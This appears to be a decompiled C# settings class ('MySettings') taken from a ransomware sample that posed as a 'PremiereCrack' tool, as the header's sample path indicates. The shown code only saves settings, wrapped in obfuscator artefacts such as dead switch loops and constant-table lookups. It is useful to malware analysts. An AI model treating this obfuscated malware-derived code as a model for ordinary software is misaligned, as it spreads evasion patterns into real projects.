// Decompiled with JetBrains decompiler
// Type: PremiereCrack.My.MySettings
// Assembly: PremiereCrack, Version=2.3.77.2, Culture=neutral, PublicKeyToken=null
// MVID: B728F238-A35B-46BB-92FD-55CC50CC96B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-27a1f89ce5a37815010c8411dddec85d5d66e81a957ad722fbd2dc64f99651c8.exe

using A;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;

namespace PremiereCrack.My
{
  [CompilerGenerated]
  [GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "12.0.0.0")]
  [EditorBrowsable(EditorBrowsableState.Advanced)]
  internal sealed class MySettings : ApplicationSettingsBase
  {
    private static MySettings defaultInstance = EH.T((object) SettingsBase.Synchronized((SettingsBase) new MySettings()));
    private static bool addedHandler;
    private static object addedHandlerLockObject = RuntimeHelpers.GetObjectValue(new object());

    [DebuggerNonUserCode]
    public MySettings()
    {
    }

    [DebuggerNonUserCode]
    [EditorBrowsable(EditorBrowsableState.Advanced)]
    private static void AutoSaveSettings(object sender, EventArgs e)
    {
      if (!I.T.SaveMySettingsOnExit)
        return;
label_1:
      switch (2)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MySettings.AutoSaveSettings);
          }
          K.Settings.Save();
          break;
      }
    }

    public static MySettings Default
    {
      get
      {
        if ((MySettings.addedHandler ? 1 : 0) == G.T(796))
        {
label_1:
          switch (7)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MySettings.get_Default);
              }
              object handlerLockObject = MySettings.addedHandlerLockObject;
              ObjectFlowControl.CheckForSyncLockOnValueType(handlerLockObject);
              bool lockTaken = G.T(800) != 0;
              try
              {
                Monitor.Enter(handlerLockObject, ref lockTaken);
                if ((MySettings.addedHandler ? 1 : 0) == G.T(804))
                {
label_6:
                  switch (5)
                  {
                    case 0:
                      goto label_6;
                    default:
                      I.T.Shutdown += (ShutdownEventHandler) ((sender, e) =>
                      {
                        if (!I.T.SaveMySettingsOnExit)
                          return;
label_1:
                        switch (2)
                        {
                          case 0:
                            goto label_1;
                          default:
                            if (false)
                            {
                              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MySettings.AutoSaveSettings);
                            }
                            K.Settings.Save();
                            break;
                        }
                      });
                      MySettings.addedHandler = G.T(808) != 0;
                      break;
                  }
                }
              }
              finally
              {
                if (lockTaken)
                {
label_9:
                  switch (5)
                  {
                    case 0:
                      goto label_9;
                    default:
                      Monitor.Exit(handlerLockObject);
                      break;
                  }
                }
              }
              break;
          }
        }
        MySettings defaultInstance = MySettings.defaultInstance;
        return defaultInstance;
      }
    }
  }
}
